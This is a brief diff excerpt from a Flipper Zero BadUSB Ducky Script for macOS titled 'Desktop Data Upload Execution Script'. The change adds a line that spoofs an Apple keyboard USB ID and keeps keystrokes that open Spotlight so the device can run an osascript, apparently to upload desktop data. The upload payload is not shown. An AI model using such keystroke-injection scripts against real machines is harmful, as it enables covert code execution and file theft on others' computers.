@@ -34,10 +34,10 @@ end repeat
 REM Title: Desktop Data Upload Execution Script 
 REM Version 1.0 MacOs
 
-REM Save the below Ducky Script as a .txt file lines 41-54 (main Read.me has step by step directions)
+REM Save the below Ducky Script as a .txt file lines 40-54 (main Read.me has step by step directions)
 REM and put the .txt file on your BADUSB flipper zero APP to execute the osascript through the terminal.
 
-
+ID 05ac:021e Apple:Keyboard
 DELAY 500
 GUI SPACE
 DELAY 500
